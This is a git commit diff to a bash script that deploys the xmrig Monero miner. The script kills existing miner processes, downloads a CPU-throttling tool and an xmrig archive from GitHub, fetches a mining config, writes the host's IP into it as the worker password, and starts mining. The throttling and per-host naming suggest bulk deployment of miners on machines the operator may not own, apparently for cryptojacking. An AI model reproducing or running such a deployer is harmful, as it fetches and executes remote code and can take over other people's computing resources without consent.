8b70627c5ac6128042055a5304ef08d5fe7b242a
mzcof <88245099+mzcof@users.noreply.github.com>
2021-08-13 04:40:06 +0800

    Update c5a.sh

--- c5a/c5a.sh
+++ c5a/c5a.sh
@@ -1,10 +1,14 @@
 #!/bin/bash
+killall xmrig
+killall cpulimit
 PASS=`ip route get 1 | awk '{print $NF;exit}'`
 apt install wget cpulimit screen -y
 wget https://raw.githubusercontent.com/mzcof/c3/main/cpurandomlimit
 chmod +x ./cpurandomlimit
-wget https://raw.githubusercontent.com/mzcof/c3/main/xmrig
+wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+tar -xvf ./xmrig.tar.gz
 chmod +x ./xmrig
+rm ./config.json
 wget https://raw.githubusercontent.com/mzcof/c3/main/c5a/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' ./config.json
 ./xmrig
